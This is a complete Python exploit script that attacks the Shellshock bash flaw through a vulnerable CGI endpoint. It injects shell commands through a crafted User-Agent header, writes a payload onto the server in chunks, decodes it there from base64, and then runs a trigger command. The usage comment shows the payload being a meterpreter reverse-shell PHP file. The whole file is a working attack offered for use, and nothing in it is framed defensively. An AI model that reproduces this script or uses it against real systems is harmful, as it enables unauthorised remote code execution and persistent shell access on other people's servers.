#!/usr/bin/env python
# Shellshock uploader/RCE by zc00l
# How to use:
# python hellshocker.py --cgi http://URL.com/cgi-bin/script \
#    --destination "/var/www/html/reverse.php" \
#    --payload "meterpretere-shell.php" \
#    --trigger "php /var/www/html/reverse.php"
#    --base64
# ========================================
# Version 0.1.1

from requests import get
from argparse import ArgumentParser
from textwrap import wrap
from os import path
from pwn import *

DEBUG=False
BASE64_FLAG = False

def shellshock_rce(vuln, rce):
    h = dict()
    h["User-Agent"] = "() { :; }; echo; echo; %s" % rce
    if DEBUG is True:
        info("DEBUG: " + h["User-Agent"])
    req = get(vuln, headers=h)
    return req.status_code

def shellshock_upload(vuln, payload, destination):
    global BASE64_FLAG
    if BASE64_FLAG is True:
        destination += ".b64"
    h = dict()
    h["User-Agent"] = "() { :; }; echo; echo; echo '%s' >> %s" % (payload, destination)
    if DEBUG is True:
        info("DEBUG: " + h["User-Agent"])
    req = get(vuln, headers=h)
    return req.status_code

def get_data_chunk(f, chunk_size=128, b64=False):
    global BASE64_FLAG
    if not path.exists(f):
        return error("File does not exists!")
    with open(f, "rb") as f:
        data = f.read().replace("\n", "")
    info("Payload file has {0} bytes".format(len(data)))
    if b64 is True:
        data = data.encode("base64")
        success("Payload data has been encoded to base64 format.")
        BASE64_FLAG = True
    info("Splitting data into chunks ...")
    if b64 is True:
        return [''.join(x.split(" ")) for x in wrap(data, chunk_size)]
    else:
        return wrap(data, chunk_size)

def main():
    parser = ArgumentParser()
    parser.add_argument("--payload", type=str, help='Payload file to upload', required=True)
    parser.add_argument("--destination", type=str, help="Relative destination path to upload the file", required=True)
    parser.add_argument("--cgi", type=str, help="Vulnerable CGI script", required=True)
    parser.add_argument("--trigger", type=str, help="Command to trigger the payload", required=True)
    parser.add_argument("--base64", action="store_true", help="Encode the payload to base64 and decode it server side", default=False)
    args = parser.parse_args()

    chunks = get_data_chunk(args.payload, b64=args.base64)
    info("There is {0} chunks to be sent to remote server".format(len(chunks)))
    i = 1
    info("Starting payload upload ...")
    for chunk in chunks:
        info("Uploading chunk #%d" % i)
        r = shellshock_upload(args.cgi, chunk, args.destination)
        i += 1
        if r != 200:
            error("Error uploading chunk! : HTTP Status {0}".format(r))
            
    success("Upload procedure has been completed.")

    if args.base64 is True:
        info("Decoding base64-encoded payload on remote server ...")
        r = shellshock_rce(args.cgi, "cat %s | base64 -d > %s" % (args.destination + ".b64", args.destination))
        if r == 200:
            success("Remote command for decoding has been sent successfully sent.")

    info("Triggering payload to execute ...")
    r = shellshock_rce(args.cgi, args.trigger)
    if r == 200:
        success("Trigger command for payload execution has been succesfully sent.")
    return 0

if __name__ == "__main__":
    main()
